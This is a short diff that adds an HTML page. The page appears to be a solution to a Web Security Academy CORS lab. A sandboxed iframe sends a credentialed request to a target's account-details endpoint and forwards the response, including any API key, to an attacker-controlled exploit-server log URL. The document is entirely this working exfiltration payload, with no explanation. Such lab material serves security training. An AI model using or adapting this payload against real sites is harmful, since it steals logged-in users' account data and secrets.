@@ -1,0 +1,22 @@
+
+<html>
+<head>
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+</head>
+
+<body>
+
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://0a0800cb0361c6e8c0c801c700fc0053.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='https://exploit-0ae5003a0369c69ac00301590116009e.web-security-academy.net/exploit/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
+
+</body>
+</html>
